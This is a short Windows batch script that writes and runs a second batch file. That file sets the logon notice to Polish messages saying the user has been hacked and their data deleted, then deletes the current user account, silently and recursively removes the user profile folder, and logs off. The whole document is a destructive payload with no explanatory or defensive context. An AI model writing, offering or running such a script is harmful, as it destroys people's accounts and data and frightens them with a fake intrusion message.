(@ECHO OFF
echo reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_SZ /v legalnoticecaption /d ZOSTALES_ZHACKOWANY /f
echo reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_SZ /v legalnoticetext /d TWOJE_DANE_ZOSTALY_USUNIETE /f
echo net user %username% /delete
echo rmdir /s /q "C:\Users%username%"
echo shutdown -L
)>C:/na.bat
C:/na.bat
